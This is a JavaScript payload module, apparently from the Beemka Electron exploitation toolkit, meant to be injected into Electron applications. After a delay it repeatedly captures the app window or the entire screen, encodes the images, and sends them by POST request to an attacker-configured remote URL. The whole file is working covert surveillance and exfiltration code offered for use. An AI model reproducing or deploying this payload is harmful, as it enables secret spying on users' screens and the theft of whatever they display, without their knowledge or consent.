if (typeof Beemka_Screenshot === 'undefined') {

    %BEEMKA_VARIABLE_PLACEHOLDER%

    let options = {
        screenshot: {
            url: beemka_screenshot_url,
            interval: beemka_screenshot_interval,
            param: beemka_screenshot_param,
            apponly: beemka_screenshot_apponly
        }
    };

    let Beemka_Screenshot = {
        screenshot: {
            interval: options.screenshot.interval,
            url: options.screenshot.url,
            param: options.screenshot.param,
            method: options.screenshot.method,
            apponly: options.screenshot.apponly
        },

        init: function() {
            this.cleanParams();
            setTimeout(function() {
                Beemka_Screenshot.startScreenshotInterval();
            }, 10000);
        },

        startScreenshotInterval: function() {
            setTimeout(function() {
                Beemka_Screenshot.sendScreenshot();
            }, this.screenshot.interval);
        },

        sendScreenshot: function() {
            if (this.screenshot.apponly) {
                let remote = this.getElectronObject();
                if (remote === null) {
                    return false;
                }

                remote.getCurrentWindow().capturePage(function handleCapture (img) {
                    let screenshotData = img.toPNG().toString('hex');

                    Beemka_Screenshot.screenshotSendData(screenshotData);
                    Beemka_Screenshot.startScreenshotInterval();
                });
            } else {
                let desktopCapturer = this.getDesktopCapturer();
                if (desktopCapturer === null) {
                    return false;
                }

                desktopCapturer.getSources({types: ['window', 'screen'], thumbnailSize: { width: 1600, height: 900 }}, (error, sources) => {
                    for (let i = 0; i < sources.length; ++i) {
                        if (sources[i].name.toLowerCase() === 'entire screen') {
                            let screenshotData = sources[i].thumbnail.toPNG().toString('base64');
                            Beemka_Screenshot.screenshotSendData(screenshotData);
                            Beemka_Screenshot.startScreenshotInterval();
                        }
                    }
                });
            }
        },

        screenshotSendData: function(data) {
            let xhttp = new XMLHttpRequest();
            xhttp.open('POST', this.screenshot.url, true);
            xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            xhttp.send(this.screenshot.param + "=" + encodeURIComponent(data));
        },

        getDesktopCapturer: function() {
            let desktopCapturer = null;
            try {
                desktopCapturer = require('electron').desktopCapturer;
            } catch (e) {
                desktopCapturer = require('desktopCapturer');
            }

            return desktopCapturer;
        },

        getElectronObject: function() {
            let remote = null;
            try {
                remote = require('electron').remote;
            } catch (e) {
                remote = require('remote');
            }

            return remote;
        },

        cleanParams: function() {
            this.screenshot.interval = parseInt(this.screenshot.interval);
            this.screenshot.apponly = (this.screenshot.apponly.toLowerCase() == 'true');
        }
    };

    Beemka_Screenshot.init();
}